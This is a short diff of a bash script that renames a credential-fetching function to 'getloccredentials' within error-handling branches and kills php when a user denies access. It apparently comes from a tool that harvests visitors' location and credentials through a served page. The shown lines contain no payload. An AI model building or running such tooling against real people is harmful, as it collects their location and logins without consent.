@@ -260,18 +260,18 @@ checkerror=$(grep -o 'Error:.*' .server/location/error.txt | cut -d " " -f2 | tr
 if [[ $checkerror == 1 ]]; then
 
 rm -rf .server/location/error.txt
-getcredentials
+getloccredentials
 elif [[ $checkerror == 2 ]]; then
 
 rm -rf .server/location/error.txt
-getcredentials
+getloccredentials
 elif [[ $checkerror == 3 ]]; then
 
 rm -rf .server/location/error.txt
-getcredentials
+getloccredentials
 elif [[ $checkerror == 4 ]]; then
 rm -rf .server/location/error.txt
-getcredentials
+getloccredentials
 else
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m User Denied Access !!\e[0m\n\n"
 killall -2 php > /dev/null 2>&1
